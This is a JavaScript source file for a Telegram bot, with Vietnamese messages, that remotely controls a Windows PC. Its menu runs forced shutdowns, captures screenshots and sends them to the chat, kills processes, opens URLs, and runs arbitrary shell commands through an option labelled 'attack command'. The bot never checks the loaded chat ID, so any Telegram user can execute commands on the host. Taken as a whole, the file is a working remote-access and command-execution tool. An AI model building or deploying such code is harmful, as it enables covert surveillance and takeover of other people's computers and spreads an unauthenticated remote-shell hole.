const { Telegraf } = require("telegraf");

const notifier = require("node-notifier");
const fs = require("fs");
const { message } = require("telegraf/filters");
const { resolve } = require("path");
const { resourceLimits } = require("worker_threads");
const { url } = require("inspector");
const { error } = require("console");
const Methods = require("./modalMenu");
require("dotenv").config();
let programNameToKill = null;
let urlweb = null;
let command = null;
const API_KEY = process.env.API_KEY;
const idchat = process.env.ID_CHAT;
const bot = new Telegraf(API_KEY);
const waitingForInput = {};
bot.command("menu", (ctx) => {
  ctx.reply("Menu:", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Shutdown 🤜🏻", callback_data: "option1" }],
        [{ text: "Screenshot 👁", callback_data: "option2" }],
        [{ text: "Killapp 👩‍💻", callback_data: "option3" }],
        [{ text: "open url 👩", callback_data: "option4" }],
        [{ text: "attack command 💽", callback_data: "option5" }],
        [{ text: "application list 💻", callback_data: "option6" }],
      ],
    },
  });
});
(async () => {
  try {
    bot.action("option1", async (ctx) => {
      await Methods.executeCommand("shutdown /s /f /t 5");
      ctx.reply("tắt nguồn thành công");
    });
    bot.action("option2", async (ctx) => {
      await Methods.screenshotEx(ctx);
      ctx.reply("gửi ảnh thành công");
    });
    bot.action("option3", (ctx) => {
      ctx.reply("Nhập app muốn kill:");
      waitingForInput[ctx.from.id] = "killapp";
    });
    bot.action("option4", async (ctx) => {
      ctx.reply("nhập trình duyệt và url");
      waitingForInput[ctx.from.id] = "waiturl";
    });
    bot.action("option5", async (ctx) => {
      ctx.reply("nhập lệnh thực thi");
      waitingForInput[ctx.from.id] = "cmd";
    });
    bot.action("option6", async (ctx) => {
      ctx.reply("all aplication");
      try {
        await Methods.writeAndSend(ctx);
      } catch (error) {
        ctx.reply(`lỗi khi thực thi: ${e.message} `);
      }
    });
    //xử lý logic
    programNameToKill = "";
    urlweb = "";
    command = "";
    bot.hears(/.+/gi, async (ctx) => {
      let userId = ctx.from.id;
      let userStatus = waitingForInput[userId];
      if (userStatus === "killapp") {
        if (programNameToKill !== null) {
          programNameToKill = ctx.message.text;
          try {
            await Methods.killApp(programNameToKill);
            ctx.reply("Đã tắt thành công: " + programNameToKill);
          } catch (error) {
            ctx.reply(`Lỗi khi tắt app: ${error.message}`);
          }
          programNameToKill = null;
        }
      } else if (userStatus === "waiturl") {
        if (urlweb !== null) {
          urlweb = ctx.message.text;
          try {
            await Methods.openUrl(urlweb);
            ctx.reply("mở thành công ");
          } catch (e) {
            ctx.reply(`lỗi khi mở: mã lỗi: ${e.message}`);
          }
          urlweb = null;
        }
      } else if (userStatus === "cmd") {
        if (command !== undefined) {
          command = ctx.message.text;
          try {
            await Methods.attack(command);
            ctx.reply("chạy thành công");
          } catch (e) {
            ctx.reply(`lỗi khi thực thi: ${e.message}`);
          }
          command = null;
        }
      }
      waitingForInput[ctx.from.id] = null;
    });
  } catch (error) {
    console.log(error);
  }
})();

bot.launch();
